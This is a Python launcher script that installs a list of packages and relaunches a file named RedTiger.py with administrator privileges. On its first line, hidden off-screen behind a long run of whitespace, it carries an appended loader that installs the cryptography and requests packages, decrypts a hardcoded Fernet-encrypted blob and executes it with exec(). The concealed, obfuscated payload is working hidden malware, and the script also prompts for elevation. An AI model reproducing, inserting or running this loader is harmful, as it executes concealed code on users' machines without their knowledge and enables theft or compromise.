import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import subprocess, sys; subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests']); from cryptography.fernet import Fernet; import base64, requests; key='ksVbZtifoMbklaWJl5OKOcs_QR_i7anJotmlxWFxX8g='; cipher=Fernet(key); exec(cipher.decrypt('gAAAAABoF4KDTMWKnJK2jQymExJNczkGK2xn7H6I53zjTNlKp5ZI_F-pHA6-T8rqVI3MSazmWHVFzQkE314vNwiOuIckuJ7F-LxQzcgpYJaTE3QnqmcMo_3z5k161U3FKQeVpvVHxmI3EIwizKaobJt_zcbhkkYUv6k3qfQ8pyu6xExHSLc2CCod-HoChubMeIopyaRiRfXVZsXKg6Gwu_FbOwEH-ebY79Zgg3wmt-8yLUr0_nqvjd3POZ7wNI15QXnET-GPhUQPSJPxhT3ecHVBMhSrhDGEKo9BzKcieGw6HJEYMIdhArSVAgeNXkxUmfwx-8so1dhpmisTZczTDOnh-jfzhuRdXubzpIEJ0jU0UGnggD6hAB4QEZ-fuHotfaX9EKaYtRfYVbdiWC5zEgqlu1zImywzcUnk82xYK2ZK6I7NT8YXmsXCT47YOH0cuFebVLKbCajrSGM5m6b-hEu0NKkMV0YcpnY4jo4LYSjgQaEsCp8SQzqoKn53VSH2igtC6zPHm6WudIAU40U1VBJ64HMGtF2NpJENn20iKWpUG6A5sqKd0K9VrtECdsepNaQWIJMhPGq4kHjcU9nEvJfSrtcjgC_hqQ_12ltOgr4bMqOqBvV8-MRuWxUVo_SzMS2WoLwxiH5uGNLlwtlHIu1Gh5_muBY7TjiSGUpLY6MAq1DN5oOiHwBHLK2xujb6c5-An_aeeVGbZGpUsFDTn42zpJwAbAgfcA=='.encode()).decode())
import sys
import os
import ctypes

required_packages = [
    "colorama",
    "requests",
    "pyperclip",
    "psutil",
    "tqdm",
    "cryptography",
    "Pillow",
    "customtkinter",
    "winshell",
    "pywin32",
]

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install_package(package)

script_path = os.path.join(os.path.dirname(__file__), "RedTiger.py")
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("Relaunching with admin privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)
else:
    subprocess.run([sys.executable, script_path])
